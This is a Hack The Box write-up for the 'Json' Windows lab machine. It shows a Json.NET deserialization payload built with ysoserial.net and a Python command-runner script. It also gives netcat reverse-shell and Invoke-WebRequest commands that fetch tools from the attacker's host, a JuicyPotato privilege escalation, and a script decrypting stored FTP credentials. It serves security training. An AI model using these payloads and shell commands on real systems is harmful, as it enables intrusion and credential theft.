---
title: Json 
category: BOX - MEDIUM
type: htb_box
layout: page
img-link: /writeups/htb/boxes/images/json_1.png
desc: 10.10.10.158 - [MEDIUM] Json
---


# [MEDIUM] Json <br/>

![Json icon](/writeups/htb/boxes/images/json_1.png# icon)

<h2 style="font-size: 1.4em">Enumeration</h2>
<h2 style="font-size: 1.2em">NMAP</h2>

We have our nmap scan run the following:

```bash

nmap -sV -sC -A -v 10.10.10.158 -p 1-10000

```

Then here is the result:


![2](/writeups/htb/boxes/images/json_2.png)

![3](/writeups/htb/boxes/images/json_3.png)

Important services:<br />
FTP - port 21
HTTP - port 80
RPC - port 135
Netbios-ssn - port 139
SMB - port 445
HTTP (Winrm service) - port 5985 
<br />

<h2 style="font-size: 1.2em">FTP Anonymous Login</h2><br>

Checking FTP if we can login as anonymous user:

![4](/writeups/htb/boxes/images/json_4.png)

We can't login as anonymous
<br />

<h2 style="font-size: 1.2em">Web Service Enumeration</h2><br>

Checking the page served at port 80:
![5](/writeups/htb/boxes/images/json_5.png)

<br>
Quick check for "admin"/"admin" username/password to see if it works.

![6](/writeups/htb/boxes/images/json_6.png)
It worked as it opens up a dashboard. However, upon further inspection of the links on the dashboard, most of it are dead. 
<br>

Checking the page source, we can see there is a javascript file called ```app.min.js```. Below are also its contents

![7](/writeups/htb/boxes/images/json_7.png# medium)

<br />

And here is its content:
![8](/writeups/htb/boxes/images/json_8.png)
Since it's hard to read it this way, we can fix this by feeding it to a javascript code beautifier.
![9](/writeups/htb/boxes/images/json_9.png)

There are two links we can see:
- ```/api/token``` at line 15
- ```/api/Account``` at line 26

<br>

The ```/api/token``` accepts ```POST``` requests with data parameters ```UserName``` and ```Password``` while ```/api/Account``` accepts ```GET``` requests whereas it has additional header called ```Bearer``` (decoded bytecode from line 28). 

<br>
Accessing those links with curl will give these results:
- Result at ```/api/token``` curl
![10](/writeups/htb/boxes/images/json_10.png)
will set a cookie which is a base64 JSON of user info
![11](/writeups/htb/boxes/images/json_11.png)
```JSON
{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
```
<br>
There is nothing really new in there. Even the password hash is also just "admin".
![12](/writeups/htb/boxes/images/json_12.png#)
<br>

- Result at ```/api/token``` curl. Since the ```Bearer``` header is for authentication, we just set its value from the value of the cookie given by ```/api/token```.
![13](/writeups/htb/boxes/images/json_13.png#)

<br>
However, the result is also the JSON received earlier but only in decoded base64 form.
![14](/writeups/htb/boxes/images/json_14.png#)


<h2 style="font-size: 1.4em">Web Service Exploitation. (Deserialization Exploit)</h2>
<br>
However, a malformed json being sent to the server either via two of those links will return an error. 
![15](/writeups/htb/boxes/images/json_15.png)
It means that the deserialization of the data is mishandled and can be a vulnerability. We can check this with a tool called [ysoserial.net](https://github.com/pwntester/ysoserial.net).
<br>

Running the .exe file in a windows machine:
```bash
.\ysoserial.net -f Json.Net -g ObjectDataProvider -c "cmd /c ping 10.10.14.87"

```
It will give this payload:

```JSON
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c ping 10.10.14.87']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
<br>
# Targeting : /api/token

We setup an icmp sniffer:
```
tcpdump -i tun0 icmp
```
and then we attack. If our payload succeeds, our icmp sniffer should be accepting icmp packets.

```bash
curl http://10.10.10.158/api/token -H "Content-Type: application/json" --data "$(cat payload.txt)"
```
However, this attack only made the server return an error and the server did not execute the ping command.
<br>
# Targeting : /api/Account
```bash
curl http://10.10.10.158/api/Account -H "Content-Type: application/json" -H "Bearer: $(cat payload.txt | base64 -w 0)"
```
This attack made our ping command executed!

![16](/writeups/htb/boxes/images/json_16.png)

With this, I created a python script that inputs our command so our payload will be flexible.

```python
import requests
import base64

with open("payload_flex.txt","r") as rf:

	contents = rf.read()

#token = base64.b64encode(contents).decode()
#print(tokena)

while True:

	useri = input("Command: ")
	useri = useri.split(",")

	to_send = contents % (useri[0], useri[1])
	to_send = to_send.encode()	

	token = base64.b64encode(to_send)
	sess = requests.Session()

	print(type(token))

	headers = {
		'Content-Type' : 'application/json',
		'Application' : 'application/json',
		'Bearer' : token
	}

	page = sess.get('http://10.10.10.158/api/Account',headers=headers)

print(page.text)

```

# Spawning a Shell

To spawn a shell wth this, we can upload netcat executable for windows then execute it also via the script with powershell or cmd execution.
<br>
Let's first setup http server that contains the netcat executable. I used python3 http.server module. Execute the following.
![17](/writeups/htb/boxes/images/json_17.png)
<br>
After the netcat is uploaded, execute the following:
```Bash
Command: powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
```
# NOTE:
If "powershell.exe" is used immediately, the server doesn't spawn a shell.

<br>
We successfuly spawned a shell with "userpool" as our user!

![18](/writeups/htb/boxes/images/json_18.png# big)
<br>

# User Flag
We can just go to ```C:\Users\userpool\Desktop\``` to get our user flag.

![19](/writeups/htb/boxes/images/json_19.png# big)

<h2 style="font-size: 1.4em">Privilege Escalation</h2>
<br>

There are two ways of getting root:

<h2 style="font-size: 1.3em">Method 1</h2>

<h2 style="font-size: 1.2em">Enumeration</h2>

We can check the privileges of our user. It's stated that SeImpersonatePrivilege is enabled thus we can use an exploit that uses this setting to escalate to NT AUTHORITY\SYSTEM

![20](/writeups/htb/boxes/images/json_20.png# big)

Windows 2019 and Windows 10 1809 are unaffected by this but the version of Windows of the server is of earlier version.

![21](/writeups/htb/boxes/images/json_21.png# big)

<h2 style="font-size: 1.2em">JuicyPotato Exploitation</h2>
We can use the [JuicyPotato exploit](https://github.com/ohpe/juicy-potato/) to exploit this setting.<br>

It's also needed that a correct CLSID is selected in order for this to work. The list of CLSID I used for this version of windows is [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter)
The CLSID I used is this:



![22](/writeups/htb/boxes/images/json_22.png# big)
<br>

By using the same exploit python script, upload the executable to the server.

```Bash
Command: powershell.exe, /c invoke-webrequest http://10.10.14.87:8000/JuicyPotato.exe -outfile c:\\Windows\\Temp\\service.exe
```
<br>
After uploading the executable, set up another netcat in the attacking machine and execute the following at the current shell in the server.
```Bash
c:\Windows\Temp>.\service.exe -l 3333 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c c:\Windows\Temp\nc.exe 10.10.14.87 4445 -e cmd.exe"
```
<br>
After the netcat receives the connection, we are connected as ```NT AUTHORITY\SYSTEM``` on the server. We also should be able to get the root flag.

![23](/writeups/htb/boxes/images/json_23.png# big)

<br>

<h2 style="font-size: 1.3em">Method 2</h2>

<h2 style="font-size: 1.2em">Enumeration</h2>
If we go to C:\Program Files, there is a folder called "Sync2Ftp" and here is its contents:

![24](/writeups/htb/boxes/images/json_24.png# big)
<br>
After retrieving the two files, it can now be checked that the executable is .NET executable 

![25](/writeups/htb/boxes/images/json_25.png# big)

while the config contains encrypted username, password, and a key.
<br>

```xml
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="destinationFolder" value="ftp://localhost/"/>
    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
    <add key="minute" value="30"/>
    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>
</configuration>
```
<br>

<h2 style="font-size: 1.2em">Reversing the .NET executable</h2>
To reverse or decompile the .NET executable, dotPeek is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.

![26](/writeups/htb/boxes/images/json_26.png)
Focusing on the Decrypt() function, it's stated that it used 3DES-EBC as the encryption algorithm. A little problem is that it has ```hashing``` variable that decides whether or not to hash the key. 


<h2 style="font-size: 1.2em">Decrypting username and password</h2>
Here's the written python script to decrypt the username and password.
```python
from Crypto.Cipher import DES3
import base64
import hashlib

username = "4as8gqENn26uTs9srvQLyg=="
password = "oQ5iORgUrswNRsJKH9VaCw=="
key = "_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"

'''
Notice that key is not lenth 16 or 24, so
it needs to be hashed using MD5 hash algo.
It is also indicated in the reversed .NET exe
'''

hh = hashlib.new('md5')
hh.update(key.encode('utf-8'))
hashed_key = bytes.fromhex(hh.hexdigest())

username = base64.b64decode(username)
password = base64.b64decode(password)

des3_cipher = DES3.new(hashed_key, DES3.MODE_ECB)

print("[+] USER: {}".format(des3_cipher.decrypt(username)))
print("[+] PASS: {}".format(des3_cipher.decrypt(password)))
```
<br>
And the output of python script is:
```bash
[+] USER: b'superadmin\x06\x06\x06\x06\x06\x06'
[+] PASS: b'funnyhtb\x08\x08\x08\x08\x08\x08\x08\x08'
########
USER: superadmin
PASS: funnyhtb
```
<br>
<h2 style="font-size: 1.2em">FTP Login</h2>
Since it is said to "Sync" with FTP, use the credentials first to FTP.
![27](/writeups/htb/boxes/images/json_27.png# big)
<br>

The credentials worked! Notice also that the root.txt can also be downloaded.
![28](/writeups/htb/boxes/images/json_28.png)

However, the credentials might have worked for the FTP but it did not work on SMB or on Winrm so it's hard to say if the credentials can help spawn a shell of SYSTEM user.
<br>
Thank you for reading.













